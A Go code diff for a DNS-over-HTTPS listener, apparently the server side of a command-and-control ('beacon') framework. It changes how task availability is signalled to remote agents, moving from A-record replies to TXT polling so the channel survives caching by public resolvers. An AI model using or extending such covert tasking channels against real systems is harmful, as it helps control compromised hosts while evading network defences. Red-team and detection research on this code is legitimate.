@@ -942,21 +942,14 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 				}
 			}
 
-			// Determine whether tasks are pending for this SID.
-			// IMPORTANT: do NOT use ackOffset here because it may refer to a previous task and can be larger
-			// than the newly generated df.total, causing a false "no tasks" result and stalling the agent.
-			hasTasks := hasDf && df != nil && df.total > 0 && df.off < df.total
+			// Recursion-stable design: do NOT use A record response as a real-time task queue signal.
+			// Public resolvers may cache/replay 0.0.0.0/0.0.0.1 and break task delivery reliability.
+			// Heartbeat is ACK-only; task availability is determined by GET(TXT) polling.
 			if dohDebug {
-				fmt.Printf("[BeaconDoH-DNS] [HB] sid=%s ack=%d nonce=%08x hasTasks=%v\n", sid, ackOffset, hbNonce, hasTasks)
+				fmt.Printf("[BeaconDoH-DNS] [HB] sid=%s ack=%d nonce=%08x\n", sid, ackOffset, hbNonce)
 			}
-
-			if hasTasks {
-				rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.1").To4()}
-				m.Answer = append(m.Answer, rr)
-			} else {
-				rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
-				m.Answer = append(m.Answer, rr)
-			}
+			rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
+			m.Answer = append(m.Answer, rr)
 
 		default:
 			rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{"OK"}}
